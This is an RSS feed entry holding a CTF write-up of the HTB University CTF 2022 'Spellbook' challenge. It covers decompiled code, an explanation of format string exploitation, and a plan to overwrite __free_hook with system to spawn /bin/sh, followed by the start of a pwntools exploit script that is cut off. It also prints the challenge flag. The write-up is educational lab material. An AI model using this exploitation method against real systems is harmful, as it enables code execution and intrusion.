<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>About on Hacklagr0y</title>
    <link>https://alagroy-42.github.io/</link>
    <description>Recent content in About on Hacklagr0y</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en-us</language>
    <lastBuildDate>Tue, 14 Jun 2022 14:23:54 +0200</lastBuildDate><atom:link href="https://alagroy-42.github.io/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>Spellbook - [HTB University CTF 2022]</title>
      <link>https://alagroy-42.github.io/writeups/spellbook/</link>
      <pubDate>Tue, 06 Dec 2022 16:43:40 +0100</pubDate>
      
      <guid>https://alagroy-42.github.io/writeups/spellbook/</guid>
      <description>The Challenge For this challenge, we have a binary named spellbook and a libc.so.6. After fuzzing the binary, we realize that it is a storage space that seems to contain 10 available indexes (0-9) to store information about a spell. Since no overflow seems obvious and that the access to the array seems to be safe, I couldn&amp;rsquo;t find any obvious flaws in the program so I opened it in Ghidra to check what was actually going on.</description>
      <content>&lt;h2 id=&#34;the-challenge&#34;&gt;The Challenge&lt;/h2&gt;
&lt;p&gt;For this challenge, we have a binary named &lt;code&gt;spellbook&lt;/code&gt; and a &lt;code&gt;libc.so.6&lt;/code&gt;. After fuzzing the binary, we realize that it is a storage space that seems to contain 10 available indexes (0-9) to store information about a spell. Since no overflow seems obvious and that the access to the array seems to be safe, I couldn&amp;rsquo;t find any obvious flaws in the program so I opened it in Ghidra to check what was actually going on.
First, we can see in the built-in types the definition of a &lt;code&gt;struct Spls&lt;/code&gt; defined as :&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;typedef&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;struct&lt;/span&gt; Spls spl;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;struct&lt;/span&gt; Spls {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; type[&lt;span style=&#34;color:#ae81ff&#34;&gt;24&lt;/span&gt;];
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; sp;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; power;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    undefined field3_0x24; &lt;span style=&#34;color:#75715e&#34;&gt;// Padding for alignement
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    undefined field4_0x25; &lt;span style=&#34;color:#75715e&#34;&gt;// Padding for alignement
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    undefined field5_0x26; &lt;span style=&#34;color:#75715e&#34;&gt;// Padding for alignement
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    undefined field6_0x27; &lt;span style=&#34;color:#75715e&#34;&gt;// Padding for alignement
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;};
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Then, we notice a very interesting function called &lt;code&gt;show&lt;/code&gt; that we can call from the menu. Here is its decompiled code :&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;show&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;{
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;long&lt;/span&gt; lVar1;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  ulong uVar2;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;long&lt;/span&gt; in_FS_OFFSET;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  size_t idx;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  lVar1 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;long&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)(in_FS_OFFSET &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x28&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  printf(&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;DAT_001017d8);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  uVar2 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; read_num();
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; ((uVar2 &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; (table[uVar2] &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; (spl &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)&lt;span style=&#34;color:#ae81ff&#34;&gt;0x0&lt;/span&gt;)) {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    printf(&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;DAT_001019a8);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    printf(table[uVar2]&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;type);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    printf(&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;DAT_001019c6);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    printf(table[uVar2]&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;sp);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  }
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt; {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    printf(&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;DAT_00101800,&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;DAT_001017f7,&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;DAT_00101198);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  }
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (lVar1 &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;long&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)(in_FS_OFFSET &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x28&lt;/span&gt;)) {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                    &lt;span style=&#34;color:#75715e&#34;&gt;/* WARNING: Subroutine does not return */&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    __stack_chk_fail();
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  }
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;This is a simple function that displays an entry from the &lt;code&gt;spl&lt;/code&gt; table. This function is using the &lt;code&gt;printf&lt;/code&gt; function to do so, with some calls on data controlled by us. That allows us to use our data with a custom &lt;code&gt;printf&lt;/code&gt; format string so that we can read/write data and eventually redirect the execution flow to get a shell.&lt;/p&gt;
&lt;p&gt;Disclaimer : The value of the flag is &lt;code&gt;HTB{f45tb1n_c0rrupt10n_0n_p4g3_gl1bc_2.23}&lt;/code&gt; which means that the author of the challenge probably wanted us to use some heap exploitation technique to get the flag. However, any modern compiler emits a warning or sometimes an error when it comes to format string so it could not have been left there unintentionally. Maybe the author of the challenge thought that it was not exploitable but it actually was.&lt;/p&gt;
&lt;p&gt;I&amp;rsquo;ll come back to why later but another interesting function from the binary is the &lt;code&gt;delete&lt;/code&gt; function :&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;delete&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;{
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;long&lt;/span&gt; lVar1;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  spl &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;__ptr;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  ulong uVar2;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;long&lt;/span&gt; in_FS_OFFSET;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  size_t idx;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  spl &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;ptr;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  lVar1 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;long&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)(in_FS_OFFSET &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x28&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  printf(&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;DAT_001017d8);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  uVar2 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; read_num();
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; ((uVar2 &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; (table[uVar2] &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; (spl &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)&lt;span style=&#34;color:#ae81ff&#34;&gt;0x0&lt;/span&gt;)) {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    __ptr &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; table[uVar2];
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    free(__ptr&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;sp);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    free(__ptr);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    printf(&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;DAT_00101978,&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;DAT_001018d0,&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;DAT_00101198);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  }
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt; {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    printf(&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;DAT_00101800,&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;DAT_001017f7,&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;DAT_00101198);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  }
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (lVar1 &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;long&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)(in_FS_OFFSET &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x28&lt;/span&gt;)) {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                    &lt;span style=&#34;color:#75715e&#34;&gt;/* WARNING: Subroutine does not return */&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    __stack_chk_fail();
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  }
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;As we can see there, we can call the &lt;code&gt;free&lt;/code&gt; function on any entry we want, which means that we can control the argument that we give it when it frees &lt;code&gt;__ptr-&amp;gt;sp&lt;/code&gt;.&lt;/p&gt;
&lt;h2 id=&#34;the-exploit&#34;&gt;The exploit&lt;/h2&gt;
&lt;h4 id=&#34;what-is-a-format-string-vulnerability-&#34;&gt;What is a format string vulnerability ?&lt;/h4&gt;
&lt;p&gt;A format string vulnerability is a vulnerability which consists in sending &lt;code&gt;printf&lt;/code&gt; formatting characters that will be interpreted as such by &lt;code&gt;printf&lt;/code&gt;. The interesting formatters are &lt;code&gt;%s&lt;/code&gt;, &lt;code&gt;%p&lt;/code&gt; and &lt;code&gt;%n&lt;/code&gt;. Even though a printing function like &lt;code&gt;printf&lt;/code&gt; might seem harmless, those three formatters combined with minimum field width and positional arguments will allow us to control the execution of the binary.
The first thing to understand is how arguments are passed to function in assembly language. The first six arguments respectively go in &lt;code&gt;rdi&lt;/code&gt;, &lt;code&gt;rsi&lt;/code&gt;, &lt;code&gt;rdx&lt;/code&gt;, &lt;code&gt;rcx&lt;/code&gt;, &lt;code&gt;r8&lt;/code&gt;, &lt;code&gt;r9&lt;/code&gt;. If a function needs more than six arguments, the other ones are passed on the stack (like in x86 32 bits). For long format strings that uses several times the same argument, &lt;code&gt;printf&lt;/code&gt; implemented what is called positional arguments. It means that the following formatter &lt;code&gt;%n$x&lt;/code&gt; will display the nth argument of &lt;code&gt;printf&lt;/code&gt; as an hexadecimal number. Since arguments over 6 are supposed to be on the stack, it means that using &lt;code&gt;%7$p&lt;/code&gt; will display the first element of the stack as a pointer. If this element is an actual pointer, &lt;code&gt;%7$s&lt;/code&gt; will show us what is inside that address (until it reaches a &lt;code&gt;&#39;\0&#39;&lt;/code&gt;).&lt;/p&gt;
&lt;p&gt;The last and most critical useful formatter is &lt;code&gt;%n&lt;/code&gt;. &lt;code&gt;%n&lt;/code&gt; takes an &lt;code&gt;int *&lt;/code&gt; as an argument and will write the number of character &lt;code&gt;printf&lt;/code&gt; already write when it reaches that formatter at this address. It means that using the minimum field width, we can print a specified number of characters to control the output of &lt;code&gt;%n&lt;/code&gt; and write anything we want wherever we want (Note: even though, this is an &lt;code&gt;int *&lt;/code&gt; that will write a 32 bits value, we can use the &lt;code&gt;hh&lt;/code&gt; or &lt;code&gt;h&lt;/code&gt; modifiers to only write 16 or 8 bits). If you didn&amp;rsquo;t get that part, you should definitely read &lt;code&gt;printf&lt;/code&gt;&amp;rsquo;s man.&lt;/p&gt;
&lt;h4 id=&#34;and-in-our-case-&#34;&gt;And in our case ?&lt;/h4&gt;
&lt;p&gt;In this challenge, the string we display is located inside the heap which means that we have absolutely no control over the stack (for the moment). Let&amp;rsquo;s open &lt;code&gt;gdb&lt;/code&gt; and take a look at what the stack frame looks like when we call &lt;code&gt;printf&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://alagroy-42.github.io/spellbook_gdb.png&#34; alt=&#34;gdb&#34;&gt;&lt;/p&gt;
&lt;p&gt;There are 3 interesting values on that frame :&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;the 3rd one : It is a pointer on the main return address, which is located one byte before a libc pointer&lt;/li&gt;
&lt;li&gt;the 8th one : It is a pointer to &lt;code&gt;__libc_start_main+240&lt;/code&gt; which will help us leak the libc&amp;rsquo;s address to defeat ASLR&lt;/li&gt;
&lt;li&gt;the 10th one : It is a pointer on a stack pointer, which means that we can use it as an argument to write the address we want to control on the stack and then use this address to arbitrarily write where we want&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Once we have everything we need to exploit this binary, here is how we will proceed: we will try to rewrite &lt;code&gt;__free_hook&lt;/code&gt;&amp;rsquo;s address to take control os the execution flow. &lt;code&gt;__free_hook&lt;/code&gt; is global variable containing a function pointer called when &lt;code&gt;free&lt;/code&gt; is called. It is set to &lt;code&gt;NULL&lt;/code&gt; by default but by controlling it, we can control the execution when we call &lt;code&gt;free&lt;/code&gt;. In the &lt;code&gt;delete&lt;/code&gt; function, we have a &lt;code&gt;free(__ptr-&amp;gt;sp);&lt;/code&gt;. If we set &lt;code&gt;__free_hook&lt;/code&gt;&amp;rsquo;s value to &lt;code&gt;system&lt;/code&gt;&amp;rsquo;s address and that we free a spell having &lt;code&gt;/bin/sh&lt;/code&gt; as a value, it will execute &lt;code&gt;system(&amp;quot;/bin/sh&amp;quot;)&lt;/code&gt;. Since we cannot write an infinite number of character using &lt;code&gt;printf&lt;/code&gt;, we will write &lt;code&gt;system&lt;/code&gt;&amp;rsquo;s address in three times, using two bytes chunks of this address.&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;use &lt;code&gt;%13$p&lt;/code&gt; to leak &lt;code&gt;__libc_start_main+240&lt;/code&gt;&amp;rsquo;s address so that we can find out where the libc is mapped in memory&lt;/li&gt;
&lt;li&gt;use &lt;code&gt;%8$p&lt;/code&gt; to leak the pointer on &lt;code&gt;main&lt;/code&gt;&amp;rsquo;s return address so that, by adding eight to it, we have a pointer on libc (it will allow us to just take care of the low bytes since the high ones already have the right value)&lt;/li&gt;
&lt;li&gt;By writing using &lt;code&gt;%15$n&lt;/code&gt; to the stack pointer, we will modify our 41th argument and make it point on the libc&amp;rsquo;s address we want to modify. We can then use &lt;code&gt;%41$n&lt;/code&gt; to set this pointer to &lt;code&gt;__free_hook&lt;/code&gt;&amp;rsquo;s address.&lt;/li&gt;
&lt;li&gt;In a loop, compute the 16 bits we want to write on &lt;code&gt;__free_hook&lt;/code&gt;&amp;rsquo;s address and then use &lt;code&gt;%13$n&lt;/code&gt; to write them. Then use &lt;code&gt;$41$n&lt;/code&gt; to update the value of &lt;code&gt;__free_hook&lt;/code&gt;&amp;rsquo;s address so that we can write the two next bytes of the address.&lt;/li&gt;
&lt;li&gt;Now that we have &lt;code&gt;__free_hook&lt;/code&gt; pointing on &lt;code&gt;system&lt;/code&gt;, we just have to create a spell having &lt;code&gt;&amp;quot;/bin/sh&amp;quot;&lt;/code&gt; in &lt;code&gt;spl-&amp;gt;sp&lt;/code&gt; and then delete it to get a shell.&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;Here is the script I made to get the flag :&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#!/usr/bin/env python3&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; pwn &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; re
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;binname &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;./spellbook&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;libname &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;./glibc/libc.so.6&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;context&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;binary &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; binname
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;binary &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; ELF(binname)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;libc &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; ELF(libname)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;add_spell&lt;/span&gt;(io, entry, payload):
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; len(payload) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1000&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        print(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;payload won&amp;#39;t fit in the buffer&amp;#34;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    io&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recvuntil(&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;gt;&amp;gt; &amp;#39;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    io&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendline(&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;1&amp;#39;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    io&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recvuntil(&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;: &amp;#39;&lt;/span&gt;)
